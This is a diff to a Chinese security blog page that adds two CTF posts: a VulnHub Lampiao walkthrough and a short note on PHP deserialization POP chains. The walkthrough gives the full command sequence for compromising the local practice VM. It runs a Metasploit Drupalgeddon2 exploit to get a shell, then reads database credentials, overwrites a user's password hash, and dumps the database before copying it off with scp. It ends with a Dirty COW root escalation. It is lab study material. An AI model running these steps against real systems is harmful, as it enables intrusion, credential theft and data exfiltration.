@@ -167,6 +167,196 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/CTF-Lampiao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Garmin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CTF-Lampiao/" class="post-title-link" itemprop="url">Lampiao</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/">VulnHub</a>是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。</p>
+<p>本次我们对Lampiao靶机进行渗透学习。</p>
+<p>由于目标靶机是在本地部署进行测试的，所以直接对C段进行扫描即可。</p>
+<p>探测靶机的 IP 地址<br>arp-scan –interface&#x3D;eth0 –localnet<br>netdiscover -i eth0 -r 192.168.184.0&#x2F;24<br>nmap -sP 192.168.184.0&#x2F;24</p>
+<p>获取靶机端口服务等详细信息<br>nmap -p- -A 192.168.184.132</p>
+<p>Metasploit Framework(MSF)是一款开源安全漏洞检测工具，附带数千个已知的软件漏洞，并保持持续更新。<br>直接使用强大的渗透工具 MSF 进行攻击。<br>msfconsole</p>
+<p>进入msfconsole后，需要进行相关的攻击操作获得shell，此时的shell为meterpreter shell。</p>
+<p>搜索drupal框架相关漏洞<br>search drupal</p>
+<p>装载攻击模块、设置靶机 IP 和端口后，启动利用过程<br>use exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2<br>set rhosts 192.168.184.132<br>set rport 1898<br>set LHOST 192.168.184.150<br>exploit</p>
+<p>到此是成功拿到meterpreter shell。</p>
+<p>进入linux原生shell<br>shell</p>
+<p>进入到linux原生shell后，使用pty模块创建了原生终端，建立交互式 shell<br>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<p>使用 exit 可以回退到上一级 shell 。</p>
+<p>可以找到存有mysql数据库连接信息的配置文件<br>cat &#x2F;var&#x2F;www&#x2F;html&#x2F;sites&#x2F;default&#x2F;settings.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;database&#x27; =&gt; &#x27;drupal&#x27;,</span><br><span class="line">&#x27;username&#x27; =&gt; &#x27;drupaluser&#x27;,</span><br><span class="line">&#x27;password&#x27; =&gt; &#x27;Virgulino&#x27;,</span><br></pre></td></tr></table></figure>
+
+<p>可以利用其密码加密脚本对自己的密码加密后，替换原来数据库中的密码，注意要记录之前的密码，以便于渗透测试完成后还原。</p>
+<p>访问数据库<br>mysql -udrupaluser -pVirgulino</p>
+<p>数据库口令字段加密脚本文件<br>cat scripts&#x2F;password-hash.sh</p>
+<p>运行加密脚本文件<br>php scripts&#x2F;password-hash.sh 123456</p>
+<p>修改数据库<br>update users set pass&#x3D;”$S$DH4HqENQ6xX&#x2F;asHITshPJl4ixv.hJT1FbKjBq98VYaDNMMPDIVeX” where name&#x3D;”tiago”;</p>
+<p>也可以在&#x2F;tmp目录下进行拖库操作<br>mysqldump -udrupaluser -pVirgulino drupal &gt; drupal.sql</p>
+<p>打包<br>tar zcvf drupal.tar.gz drupal.sql</p>
+<p>下载到本机（在 meterpreter shell 中操作）<br>download &#x2F;tmp&#x2F;drupal.tar.gz &#x2F;root</p>
+<p>发送给另外一个机器<br>scp drupal.tar.gz 192.168.184.200:&#x2F;root&#x2F;</p>
+<p>解压<br>tar -xvf drupal.tar.gz</p>
+<p>导入数据库<br>mysql -uroot -p drupal &lt; drupal.sql</p>
+<p>也可以利用脏牛漏洞做提权操作</p>
+<p>查看靶机系统版本<br>uname -a</p>
+<p>查看靶机发行版本<br>lsb_release -a</p>
+<p>查寻“脏牛”漏洞利用程序<br>searchsploit dirty</p>
+<p>上传利用程序到靶机（在 meterpreter shell 中操作）<br>upload &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp &#x2F;tmp</p>
+<p>编译利用程序<br>g++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o dirty &#x2F;tmp&#x2F;40847.cpp -lutil</p>
+<p>运行编译后的程序提权<br>.&#x2F;dirty</p>
+<p>提权<br>su</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/CTF-%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+      <meta itemprop="name" content="Garmin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 94RM1n">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/CTF-%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-title-link" itemprop="url">浅谈php反序列化</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>新手可以先看这篇了解php反序列化。<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2348156">PHP的反序列化和POP链利用 - 腾讯云</a></p>
+<h2 id="pop链的构造思路"><a href="#pop链的构造思路" class="headerlink" title="pop链的构造思路"></a>pop链的构造思路</h2><p>针对于php魔术方法的触发条件而言，入口点通常会是wakeup，destruct，construct。</p>
+<p>至于如何构造完整的pop链，可以从正向和反向两种思路进行处理。</p>
+<p>可以看这篇博文感受反向推导的快感。<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/oyf3085227433/article/details/135455351">php反序列化学习 pop链构造 - CSDN</a></p>
+<p>魔术方法的触发要点可以看这篇<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/377676274">PHP反序列化研究 - 知乎</a></p>
+<p>触发某对象中的魔术方法，通常是基于对该对象的操作。</p>
+<h2 id="对不同类型的属性赋值"><a href="#对不同类型的属性赋值" class="headerlink" title="对不同类型的属性赋值"></a>对不同类型的属性赋值</h2><p>构造pop链中，对非public类型的属性赋值时，可以使用构造函数<code>__construct()</code>进行赋值，并且序列化后存有非public类型的属性是会产生不可见字符的，在<a target="_blank" rel="noopener" href="https://www.jyshare.com/compile/1/">PHP 在线工具 | 菜鸟工具</a>能够观察到，可以使用 urlencode() 直接进行编码操作。</p>
+<h2 id="找到pop链的终点"><a href="#找到pop链的终点" class="headerlink" title="找到pop链的终点"></a>找到pop链的终点</h2><p>终点通常是获取flag或者是执行命令。</p>
+<p>当没有发现明显的终点时，要注意构造出命令执行等操作的形式。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://example.com/WriteUP-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%20PHP/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
